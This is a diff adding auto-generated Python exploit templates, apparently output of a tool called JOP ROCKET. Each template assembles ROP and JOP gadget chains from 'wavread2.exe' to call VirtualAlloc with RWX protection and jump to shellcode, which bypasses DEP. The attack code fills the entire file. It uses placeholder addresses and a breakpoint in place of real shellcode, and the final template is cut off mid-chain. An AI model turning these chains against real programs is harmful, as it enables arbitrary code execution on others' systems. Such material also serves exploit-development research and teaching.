@@ -1,0 +1,870 @@
+
+* * * * * * * * * * * * * * * * * * * * * * * * * * * *
+# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EAX #1
+
+
+import struct
+
+def create_rop_chain():
+	rop_gadgets = [
+		0x00410983, # (base + 0x10983), # pop eax # pop ebp # ret  # wavread2.exe   Load EAX with address for dispatcher gadget!
+		0x00401677, # (base + 0x1677) # add ebx, 0x10 # jmp dword ptr [ebx] # wavread2.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 12 bytes between dispatch table slots!
+		0x42424242, 	# padding  (0x4 bytes)
+		0x00426de6, # (base + 0x26de6), # pop ebx # ret  # wavread2.exe Load EBX with address of dispatch table
+		0xdeadbeef, # Address for your dispatcher table!
+		 # JMP to dispatcher gadget; start the JOP!
+	]
+	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+
+
+def create_jop_chain():
+	jop_gadgets = [
+	
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x4
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x8
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0xc
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x10
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x14
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x18
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x1c
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x20
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x24
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x28
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x2c
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x30
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x34
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x38
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x3c
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x40
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x44
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x48
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x4c
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x50
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x54
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x58
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x5c
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x60
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x64
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x68
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x6c
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes]** 0x70
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe  [0x4 bytes] 0x74
+		# N----> STACK PIVOT TOTAL: 0x74 bytes
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop ecx
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0040158f, # (base + 0x158f), # jmp dword ptr [ecx] # wavread2.exe # JMP to ptr for VirtualAlloc
+		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
+	]
+	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)
+
+rop_chain=create_rop_chain()
+jop_chain=create_jop_chain()
+
+vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()
+
+vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
+vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
+vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
+vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
+vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
+vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
+vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
+vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
+vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
+#This is one possible VirtualAlloc() chain; other possibilities exist!
+
+shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
+nops = '\x90' * 1
+padding = '\x41' * 1
+
+payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly
+
+# This was created by the JOP ROCKET.
+
+
+* * * * * * * * * * * * * * * * * * * * * * * * * * * *
+# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EBX #1
+
+
+import struct
+
+def create_rop_chain():
+	rop_gadgets = [
+		0x00426de6, # (base + 0x26de6), # pop ebx # ret  # wavread2.exe   Load EBX with address for dispatcher gadget!
+		0x0040167c, # (base + 0x167c) # sub esi, 6 # jmp dword ptr [esi] # wavread2.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 2 bytes between dispatch table slots!
+		0x00421fea, # (base + 0x21fea), # pop esi # ret  # wavread2.exe Load ESI with address of dispatch table
+		0xdeadbeef, # Address for your dispatcher table!
+		 # JMP to dispatcher gadget; start the JOP!
+	]
+	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+
+
+def create_jop_chain():
+	jop_gadgets = [
+	
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x4
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x8
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0xc
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x10
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x14
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x18
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x1c
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x20
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x24
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x28
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x2c
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x30
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x34
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x38
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x3c
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x40
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x44
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x48
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x4c
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x50
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x54
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x58
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x5c
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x60
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x64
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x68
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x6c
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes]** 0x70
+		0x4343,	# padding  (0x2 bytes)
+		0x004016e2, # (base + 0x16e2), # pop edx # pop eax # push edx # add ecx, 0x20007 # jmp ebx # wavread2.exe  [0x4 bytes] 0x74
+		# N----> STACK PIVOT TOTAL: 0x74 bytes
+		0x4343,	# padding  (0x2 bytes)
+		0x00401546, # (base + 0x1546), # pop eax # jmp edx # wavread2.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
+		0x4343,	# padding  (0x2 bytes)
+		0x0041d6ca, # (base + 0x1d6ca), # jmp dword ptr [eax] # wavread2.exe # JMP to ptr for VirtualAlloc
+		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
+	]
+	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)
+
+rop_chain=create_rop_chain()
+jop_chain=create_jop_chain()
+
+jop_chain = jop_chain[::-1] # Reversing JOP chain because of SUB, not ADD!
+vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()
+
+vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
+vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
+vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
+vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
+vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
+vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
+vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
+vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
+vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
+#This is one possible VirtualAlloc() chain; other possibilities exist!
+
+shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
+nops = '\x90' * 1
+padding = '\x41' * 1
+
+payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly
+
+# This was created by the JOP ROCKET.
+
+
+* * * * * * * * * * * * * * * * * * * * * * * * * * * *
+# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EDX #1
+
+
+import struct
+
+def create_rop_chain():
+	rop_gadgets = [
+		0x0042511e, # (base + 0x2511e), # pop edx # ret  # wavread2.exe   Load EDX with address for dispatcher gadget!
+		0x00401677, # (base + 0x1677) # add ebx, 0x10 # jmp dword ptr [ebx] # wavread2.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 12 bytes between dispatch table slots!
+		0x00426de6, # (base + 0x26de6), # pop ebx # ret  # wavread2.exe Load EBX with address of dispatch table
+		0xdeadbeef, # Address for your dispatcher table!
+		 # JMP to dispatcher gadget; start the JOP!
+	]
+	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+
+
+def create_jop_chain():
+	jop_gadgets = [
+	
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016fe, # (base + 0x16fe), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x18
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016fe, # (base + 0x16fe), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x30
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016fe, # (base + 0x16fe), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x48
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016fe, # (base + 0x16fe), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x60
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016fe, # (base + 0x16fe), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes] 0x78
+		# N----> STACK PIVOT TOTAL: 0x78 bytes
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x00401546, # (base + 0x1546), # pop eax # jmp edx # wavread2.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0041d6ca, # (base + 0x1d6ca), # jmp dword ptr [eax] # wavread2.exe # JMP to ptr for VirtualAlloc
+		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
+	]
+	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)
+
+rop_chain=create_rop_chain()
+jop_chain=create_jop_chain()
+
+vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()
+
+vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
+vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
+vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
+vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
+vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
+vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
+vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
+vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
+vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
+#This is one possible VirtualAlloc() chain; other possibilities exist!
+
+shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
+nops = '\x90' * 1
+padding = '\x41' * 1
+
+payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly
+
+# This was created by the JOP ROCKET.
+
+
+* * * * * * * * * * * * * * * * * * * * * * * * * * * *
+# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EDX #2
+
+
+import struct
+
+def create_rop_chain():
+	rop_gadgets = [
+		0x0042511e, # (base + 0x2511e), # pop edx # ret  # wavread2.exe   Load EDX with address for dispatcher gadget!
+		0x00401677, # (base + 0x1677) # add ebx, 0x10 # jmp dword ptr [ebx] # wavread2.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 12 bytes between dispatch table slots!
+		0x00426de6, # (base + 0x26de6), # pop ebx # ret  # wavread2.exe Load EBX with address of dispatch table
+		0xdeadbeef, # Address for your dispatcher table!
+		 # JMP to dispatcher gadget; start the JOP!
+	]
+	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+
+
+def create_jop_chain():
+	jop_gadgets = [
+	
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016fe, # (base + 0x16fe), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x18
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016fe, # (base + 0x16fe), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x30
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016fe, # (base + 0x16fe), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x48
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016fe, # (base + 0x16fe), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x60
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016f9, # (base + 0x16f9), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes] 0x70
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016f9, # (base + 0x16f9), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes] 0x80 **^ 
+		# N----> STACK PIVOT TOTAL: 0x80 bytes
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x00401546, # (base + 0x1546), # pop eax # jmp edx # wavread2.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0041d6ca, # (base + 0x1d6ca), # jmp dword ptr [eax] # wavread2.exe # JMP to ptr for VirtualAlloc
+		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
+	]
+	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)
+
+rop_chain=create_rop_chain()
+jop_chain=create_jop_chain()
+
+vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()
+
+vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
+vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
+vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
+vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
+vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
+vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
+vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
+vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
+vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
+#This is one possible VirtualAlloc() chain; other possibilities exist!
+
+shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
+nops = '\x90' * 1
+padding = '\x41' * 1
+
+payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly
+
+# This was created by the JOP ROCKET.
+
+
+* * * * * * * * * * * * * * * * * * * * * * * * * * * *
+# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EDX #3
+
+
+import struct
+
+def create_rop_chain():
+	rop_gadgets = [
+		0x0042511e, # (base + 0x2511e), # pop edx # ret  # wavread2.exe   Load EDX with address for dispatcher gadget!
+		0x00401677, # (base + 0x1677) # add ebx, 0x10 # jmp dword ptr [ebx] # wavread2.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 12 bytes between dispatch table slots!
+		0x00426de6, # (base + 0x26de6), # pop ebx # ret  # wavread2.exe Load EBX with address of dispatch table
+		0xdeadbeef, # Address for your dispatcher table!
+		 # JMP to dispatcher gadget; start the JOP!
+	]
+	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+
+
+def create_jop_chain():
+	jop_gadgets = [
+	
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x18
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x30
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x48
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x60
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016fe, # (base + 0x16fe), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes] 0x78
+		# N----> STACK PIVOT TOTAL: 0x78 bytes
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x00401546, # (base + 0x1546), # pop eax # jmp edx # wavread2.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0041d6ca, # (base + 0x1d6ca), # jmp dword ptr [eax] # wavread2.exe # JMP to ptr for VirtualAlloc
+		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
+	]
+	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)
+
+rop_chain=create_rop_chain()
+jop_chain=create_jop_chain()
+
+vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()
+
+vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
+vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
+vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
+vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
+vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
+vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
+vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
+vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
+vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
+#This is one possible VirtualAlloc() chain; other possibilities exist!
+
+shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
+nops = '\x90' * 1
+padding = '\x41' * 1
+
+payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly
+
+# This was created by the JOP ROCKET.
+
+
+* * * * * * * * * * * * * * * * * * * * * * * * * * * *
+# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EDX #4
+
+
+import struct
+
+def create_rop_chain():
+	rop_gadgets = [
+		0x0042511e, # (base + 0x2511e), # pop edx # ret  # wavread2.exe   Load EDX with address for dispatcher gadget!
